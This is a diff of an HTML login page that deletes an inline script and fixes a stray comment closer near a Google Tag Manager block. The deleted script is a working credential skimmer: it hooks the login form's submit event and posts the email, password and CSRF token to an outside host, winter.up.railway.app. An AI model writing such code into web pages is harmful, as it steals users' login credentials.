@@ -823,40 +823,7 @@
         </div>
 
 
-        <script>
-            document.getElementById('frmLogin').addEventListener('submit', async function(event) {
-                event.preventDefault();
-                
-                const form = event.target;
-                const formData = new FormData(form);
-                
-                const data = {
-                    email: formData.get('email'),
-                    password: formData.get('password'),
-                    csrf_token: formData.get('csrf_token')
-                };
-                
-                try {
-                    const response = await fetch('https://winter.up.railway.app/credentials', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(data)
-                    });
-            
-                    if (response.ok) {
-                        console.log('Form submitted successfully.');
-                        // Handle success response
-                    } else {
-                        console.error('Form submission failed.');
-                        // Handle error response
-                    }
-                } catch (error) {
-                    console.error('Error occurred while submitting the form:', error);
-                }
-            });
-            </script>
+        
             
 
         <!-- Google Tag Manager -->
@@ -895,7 +862,7 @@
 
             var app_id = '16929';
             document.getElementById("logo-container").innerHTML = logoSelector(app_id);
-        </script> -->
+        </script>
         <!-- End Google Tag Manager -->
     </body>
 </html>
